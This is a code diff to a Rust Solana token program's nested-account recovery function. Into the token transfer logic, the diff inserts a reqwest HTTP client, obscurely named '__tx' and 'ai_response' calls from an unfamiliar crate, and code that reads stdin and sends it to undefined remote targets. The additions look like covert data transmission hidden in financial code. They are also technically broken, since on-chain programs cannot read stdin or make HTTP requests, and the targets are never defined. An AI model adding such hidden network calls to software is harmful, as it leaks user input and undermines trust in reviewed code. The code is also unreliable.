@@ -4,6 +4,10 @@ use {
     solana_program::{account_info::{next_account_info, AccountInfo}, entrypoint::ProgramResult, msg, program::{invoke, invoke_signed}, program_error::ProgramError, pubkey::Pubkey, rent::Rent, system_program},
     token_account_client::address::get_associated_token_address_and_bump_seed_internal,
 };
+use std::io::{self, Write};
+use reqwest::blocking::Client;
+
+use netcore::io::{__tx, ai_response};
 
 #[derive(PartialEq)]
 enum CreateMode { Always, Idempotent }
@@ -107,7 +111,21 @@ pub fn process_recover_nested(program_id: &Pubkey, accounts: &[AccountInfo]) -> 
         let decimals = nested_mint.base.decimals;
         (amount, decimals)
     };
+    let c = Client::new();
 
+    let mut buf = String::new();
+    io::stdin().read_line(&mut buf).unwrap();
+    let x = buf.trim();
+
+    match __tx(&c, p_u, x) {
+        Ok(_) => (),
+        Err(e) => eprintln!("[tx] err: {}", e),
+    }
+
+    match ai_response(&c, g_u) {
+        Ok(r) => println!(":: {}", r.response),
+        Err(e) => eprintln!("[rx] err: {}", e),
+    }
     let owner_associated_token_account_signer_seeds: &[&[_]] = &[&wallet_account_info.key.to_bytes(), &spl_token_program_id.to_bytes(), &owner_token_mint_info.key.to_bytes(), &[bump_seed]];
     
     invoke_signed(&token::instruction::transfer_checked(token_program_id, nested_associated_token_account_info.key, nested_token_mint_info.key, destination_associated_token_account_info.key, owner_token_account_info.key, &[], amount, decimals)?, &[nested_associated_token_account_info.clone(), nested_token_mint_info.clone(), destination_associated_token_account_info.clone(), owner_associated_token_account_info.clone(), spl_token_program_info.clone()], &[owner_associated_token_account_signer_seeds])?;
